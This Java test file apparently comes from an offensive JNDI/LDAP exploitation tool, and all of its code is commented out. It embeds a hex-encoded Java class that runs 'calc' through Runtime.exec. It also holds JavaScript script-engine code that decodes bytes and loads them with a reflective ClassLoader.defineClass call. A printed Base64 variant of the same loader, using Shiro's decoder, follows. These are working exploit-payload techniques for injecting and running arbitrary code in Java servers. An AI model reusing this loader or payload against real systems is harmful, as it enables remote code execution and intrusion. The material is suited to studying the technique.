import com.feihong.ldap.gadgets.utils.ClassFiles;
import org.apache.tomcat.util.buf.HexUtils;
import weblogic.utils.encoders.Base64Bytes;

import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;

public class Test {

//    @org.junit.Test
//    public void test() throws Exception {
////        ByteBuffer byteBuffer = ByteBuffer.allocate(100);
////        byteBuffer.put((byte) 1);
////        byteBuffer.array().length;
//        ;
//        ByteArrayOutputStream baous = new ByteArrayOutputStream();
//        baous.write(1);
//        baous.toByteArray();
//
////
////        byte[] bytes =  ClassFiles.classAsBytes(TestCase.class);
////        String hex = HexUtils.toHexString(bytes);
//
//        String hex = "cafebabe0000003200260a000800170a0018001908001a0a0018001b07001c0a0005001d07001e07001f0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010001650100154c6a6176612f696f2f494f457863657074696f6e3b0100047468697301000a4c54657374436173653b01000d537461636b4d61705461626c6507001e07001c01000a536f7572636546696c6501000d54657374436173652e6a6176610c0009000a0700200c0021002201000463616c630c002300240100136a6176612f696f2f494f457863657074696f6e0c0025000a01000854657374436173650100106a6176612f6c616e672f4f626a6563740100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000f7072696e74537461636b547261636500210007000800000000000100010009000a0001000b0000007c00020002000000162ab70001b800021203b6000457a700084c2bb60006b100010004000d001000050003000c0000001a00060000000400040006000d000900100007001100080015000a000d00000016000200110004000e000f0001000000160010001100000012000000100002ff0010000107001300010700140400010015000000020016";
//
//
//        String code = "var hex = '" + hex + "';\n" +
//                "hex = hex.length() % 2 != 0 ? \"0\" + hex : hex;\n" +
//                " \n" +
//                "    var b = new java.io.ByteArrayOutputStream();\n" +
//                "    for (var i = 0; i < hex.length() / 2; i++) {\n" +
//                "        var index = i * 2;\n" +
//                "        var v = java.lang.Integer.parseInt(hex.substring(index, index + 2), 16);\n" +
//                "        b.write(v);\n" +
//                "    };\nb.close();" +
//                "   var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
//                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
//                "   method.setAccessible(true);\n" +
//                "   var clazz = method.invoke(classLoader, b.toByteArray(), 0, b.toByteArray().length);\n" +
//                "   clazz.newInstance();\n";
//
//        ScriptEngineManager manager = new ScriptEngineManager();
//        Object result = manager.getEngineByName("javascript").eval(code);
//        System.out.println("var bytes = org.apache.shiro.codec.Base64.decode('123');\n" +
//                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
//                "        try{\n" +
//                "            var clazz = classLoader.loadClass('123');\n" +
//                "            clazz.newInstance();\n" +
//                "        }catch(err){\n" +
//                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
//                "            method.setAccessible(true);\n" +
//                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
//                "            clazz.newInstance();\n" +
//                "        }");
////        System.out.println(result.getClass().getName());
////        System.out.println(result.getClass().getName());
//
//    }

//    @org.junit.Test
//    public void test2() throws IOException {
//        String code = "";
//        byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(code);
//        FileOutputStream fous = new FileOutputStream("123.class");
//        fous.write(bytes);
//        fous.close();
//    }
}
